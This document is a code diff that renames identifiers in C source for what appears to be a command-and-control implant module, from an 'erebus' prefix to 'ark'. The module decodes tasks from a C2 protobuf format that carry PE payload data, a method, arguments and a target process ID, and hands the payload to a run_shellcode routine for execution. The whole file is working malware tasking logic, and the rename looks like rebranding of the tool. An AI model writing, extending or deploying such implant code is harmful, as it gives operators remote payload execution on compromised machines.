@@ -3,28 +3,28 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include "erebus/pb_c2.h"
-#include "erebus/pb_wire.h"
+#include "ark/pb_c2.h"
+#include "ark/pb_wire.h"
 
-typedef struct erebus_peload_task {
+typedef struct ark_peload_task {
     uint8_t *pe_data;
     size_t   pe_data_len;
     char     method[64];
     char     args[256];
     uint32_t target_pid;
-} erebus_peload_task;
+} ark_peload_task;
 
-static int decode_peload_task(const uint8_t *in, size_t in_len, erebus_peload_task *t) {
+static int decode_peload_task(const uint8_t *in, size_t in_len, ark_peload_task *t) {
     memset(t, 0, sizeof(*t));
-    erebus_pb_reader r;
-    erebus_pb_reader_init(&r, in, in_len);
+    ark_pb_reader r;
+    ark_pb_reader_init(&r, in, in_len);
     uint32_t field;
     uint8_t wire;
-    while (erebus_pb_reader_next(&r, &field, &wire)) {
+    while (ark_pb_reader_next(&r, &field, &wire)) {
         if (field == 1 && wire == 2) {
             const uint8_t *b;
             size_t n;
-            if (erebus_pb_read_bytes(&r, &b, &n)) {
+            if (ark_pb_read_bytes(&r, &b, &n)) {
                 t->pe_data = (uint8_t *)malloc(n);
                 if (!t->pe_data) return 0;
                 memcpy(t->pe_data, b, n);
@@ -33,7 +33,7 @@ static int decode_peload_task(const uint8_t *in, size_t in_len, erebus_peload_ta
         } else if (field == 2 && wire == 2) {
             const uint8_t *b;
             size_t n;
-            if (erebus_pb_read_bytes(&r, &b, &n)) {
+            if (ark_pb_read_bytes(&r, &b, &n)) {
                 size_t cpy = n < sizeof(t->method) - 1 ? n : sizeof(t->method) - 1;
                 memcpy(t->method, b, cpy);
                 t->method[cpy] = '\0';
@@ -41,16 +41,16 @@ static int decode_peload_task(const uint8_t *in, size_t in_len, erebus_peload_ta
         } else if (field == 3 && wire == 2) {
             const uint8_t *b;
             size_t n;
-            if (erebus_pb_read_bytes(&r, &b, &n)) {
+            if (ark_pb_read_bytes(&r, &b, &n)) {
                 size_t cpy = n < sizeof(t->args) - 1 ? n : sizeof(t->args) - 1;
                 memcpy(t->args, b, cpy);
                 t->args[cpy] = '\0';
             }
         } else if (field == 4 && wire == 0) {
             uint64_t v;
-            if (erebus_pb_read_varint(&r, &v)) t->target_pid = (uint32_t)v;
+            if (ark_pb_read_varint(&r, &v)) t->target_pid = (uint32_t)v;
         } else {
-            erebus_pb_skip(&r, wire);
+            ark_pb_skip(&r, wire);
         }
     }
     return t->pe_data && t->pe_data_len > 0;
@@ -68,8 +68,8 @@ static int run_shellcode(const uint8_t *sc, size_t sc_len) {
     return 1;
 }
 
-int erebus_task_peload(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
-    erebus_peload_task task;
+int ark_task_peload(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+    ark_peload_task task;
     if (!decode_peload_task(data, data_len, &task)) return 0;
 
     int success = 0;
@@ -77,7 +77,7 @@ int erebus_task_peload(const uint8_t *data, size_t data_len, uint8_t **out, size
         success = run_shellcode(task.pe_data, task.pe_data_len);
     }
 
-    int ok = erebus_pb_encode_peload_result(success, NULL, 0, out, out_len);
+    int ok = ark_pb_encode_peload_result(success, NULL, 0, out, out_len);
     free(task.pe_data);
     return ok;
 }
